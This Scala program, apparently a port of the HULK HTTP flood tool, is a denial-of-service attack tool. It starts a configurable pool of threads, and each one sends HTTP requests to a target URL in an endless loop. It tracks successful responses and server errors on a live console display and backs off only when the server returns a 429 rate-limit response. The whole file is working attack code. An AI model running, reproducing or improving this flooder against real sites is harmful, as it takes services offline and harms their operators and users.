import java.util.concurrent.Executors
import http._
import scopt.OParser
import scala.util.control.Breaks._
import scala.concurrent.Future
import scala.util.{Failure, Success}
import scala.concurrent._
// https://stackoverflow.com/questions/32306671/can-only-do-4-concurrent-futures-as-maximum-in-scala

object Hulk extends App {
  System.setProperty("sun.net.http.allowRestrictedHeaders", "true")

  val (url: String, maxProcess: Int) = OParser.parse(utilities.ArgParser.parser, args, utilities.Config()) match {
    case Some(c) =>
      Tuple2(c.url, c.maxProcess)
    case _ =>
      sys.exit(1)
  }

  println(f"URL = $url")

  var uri = new java.net.URI(url)
  val host = uri.getHost
  val headers = new Headers(host)
  val caller = new HttpCaller(url, headers)

  // Used for http calling threads
  val ec1 = ExecutionContext.fromExecutorService{Executors.newFixedThreadPool(maxProcess)}
  // used to temporary show witch futures were able to get a response
  val ec2 = scala.concurrent.ExecutionContext.Implicits.global

  @volatile
  var sent = 0
  @volatile
  var err = 0
  @volatile
  var responseCode: Int = 0
  @volatile
  var responded: collection.mutable.Set[Int] = collection.mutable.Set()

  /**
   * Add future id to `responded`. Has a lifetime of 100 ms.
   * @param i Future count
   */
  def temporal(i: Int): Unit = {
    responded.add(i)
    blocking(
      Thread.sleep(100)
    )
    responded.remove(i)
  }

  def threadFunc(i: Int): Unit ={
    while (true) {

      // Will expand the thread pool if global EC is used
      // https://stackoverflow.com/questions/29068064/scala-concurrent-blocking-what-does-it-actually-do
      blocking{
        val r = caller()

        Future(temporal(i))(ec1)
        r match {
          case Success(response) =>
            responseCode = response.code
            if (response.isSuccess)
              sent += 1
            if (response.isServerError)
              err += 1
            if (response.code == 429)
              break
          case Failure(_: java.net.SocketTimeoutException
                       |_: java.net.ConnectException
                       |_: javax.net.ssl.SSLException) =>
          case Failure(e) => print(e)
        }
      }
    }
  }

  println("In use              |\t Effective |\tResp OK |\tGot err |\tLatest response")

  val futures = for (i <- 0 until maxProcess)
    yield Future(threadFunc(i))(ec2)

  while (true) {
    if (sent % 10 == 0) {
      val nFutures = futures.count(f => !f.isCompleted)
      val nResponse = responded.size
      print(f"\r$nFutures%6d of max $maxProcess%6d|\t$nResponse%6d     |\t$sent%7d |\t$err%7d |\t$responseCode%6d")
    }
    Thread.sleep(100)
  }
}
